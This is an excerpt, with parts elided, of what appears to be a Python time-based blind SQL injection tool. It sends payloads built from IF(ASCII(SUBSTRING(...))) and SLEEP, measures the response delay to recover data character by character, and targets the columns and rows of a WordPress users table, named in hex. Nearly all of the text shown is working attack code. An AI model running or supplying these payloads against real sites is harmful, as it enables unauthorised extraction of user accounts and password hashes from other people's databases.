...
def extract_value(url, headers, payload_template, label, **kwargs):
    ...
    while True:
        ...
        for ascii_code in ascii_range:
            payload_raw = payload_template.format(pos=pos, ascii=ascii_code, sleep=sleep_time, **kwargs)
            ...
            print(f"Testing {label} pos={pos}, ascii={ascii_code} ({chr(ascii_code)}), time=", end="")
            start = time.time()
...
""")
        ...
        if choice == '1':
            ...
            payload = ("IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns "
               "WHERE table_name=0x77705f7573657273 AND table_schema=DATABASE() "
            ...
            payload = ("(SELECT IF(ASCII(SUBSTRING((SELECT {column} FROM {table} "
                       "LIMIT {index},1),{pos},1))={ascii}, SLEEP({sleep}), 0))")
